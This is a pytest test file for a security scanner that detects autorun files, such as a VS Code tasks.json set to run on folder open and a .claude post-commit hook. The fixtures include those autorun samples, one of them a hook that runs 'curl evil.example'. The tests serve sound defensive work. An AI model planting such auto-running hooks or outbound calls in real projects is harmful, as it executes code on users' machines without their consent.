"""Feature 0091 — an autorun file must be found when the scan root IS the
editor directory.

`scan_autorun_files` decides membership with `is_autorun_path(rel_to_root)`,
and the pattern it matches against is rooted at the repository (`.vscode/
tasks.json`). Point the scan at `.vscode` itself and the relative path becomes
`tasks.json`: the segment that identifies it is the one that got consumed as
the root, so the walk yields nothing.

Measured live: a CWE rescan of `/home/user/danger/blu-simulator/.vscode`
returned 0 findings while the malicious `tasks.json` sat on disk, and because
the row's tier is deterministic, absence closed VLT-92190 as `fixed` a second
time — the exact silent-closure this feature exists to end.
"""

import json

import pytest

from shared.tools.file_scanner import scan_autorun_files

TASKS = {
    "version": "2.0.0",
    "tasks": [
        {
            "label": "install",
            "type": "shell",
            "command": "npm install -s && npm start",
            "runOptions": {"runOn": "folderOpen"},
        }
    ],
}


@pytest.fixture
def workspace(tmp_path):
    vscode = tmp_path / ".vscode"
    vscode.mkdir()
    (vscode / "tasks.json").write_text(json.dumps(TASKS))
    (vscode / "settings.json").write_text("{}")
    (tmp_path / "package.json").write_text("{}")
    return tmp_path


def test_autorun_found_when_root_is_the_repository(workspace):
    """The case that already worked — kept so the fix cannot regress it."""
    found = {p.name for p in scan_autorun_files(str(workspace))}
    assert "tasks.json" in found, f"expected tasks.json, got {sorted(found)}"


def test_autorun_found_when_root_is_the_editor_dir_itself(workspace):
    """Scanning `.vscode` directly must find the same file.

    A sub-path scan is an ordinary thing to run — it is what the UI issues when
    a user rescans a finding's own directory — and it must not silently report
    a clean tree.
    """
    found = {p.name for p in scan_autorun_files(str(workspace / ".vscode"))}
    assert "tasks.json" in found, (
        f"scanning the editor directory itself found {sorted(found)}; "
        "an autorun file must not become invisible because the scan stood on it"
    )


def test_autorun_found_when_root_is_below_the_editor_dir(workspace):
    """A nested autorun directory, scanned from inside, behaves the same."""
    hooks = workspace / ".claude" / "hooks"
    hooks.mkdir(parents=True)
    (hooks / "post-commit").write_text("#!/bin/sh\ncurl evil.example\n")
    found = {p.name for p in scan_autorun_files(str(hooks))}
    assert "post-commit" in found, f"got {sorted(found)}"


def test_non_autorun_root_still_yields_nothing(workspace):
    """The fix must not make every file in every directory an autorun file."""
    src = workspace / "src"
    src.mkdir()
    (src / "index.js").write_text("console.log(1)\n")
    assert scan_autorun_files(str(src)) == []


def test_autorun_found_when_root_is_the_container_of_a_nested_autorun_dir(workspace):
    """Scanning `.claude` must still descend into `hooks/`.

    The directory side has the same shape as the file side: `_is_autorun_dir`
    matches root-relative paths against prefixes rooted at the repository
    (`.claude/hooks`), so standing on `.claude` leaves the bare segment
    `hooks`, and a directory the walker must enter looks like one to prune.
    """
    hooks = workspace / ".claude" / "hooks"
    hooks.mkdir(parents=True)
    (hooks / "post-commit").write_text("#!/bin/sh\ncurl evil.example\n")
    found = {p.name for p in scan_autorun_files(str(workspace / ".claude"))}
    assert "post-commit" in found, f"got {sorted(found)}"
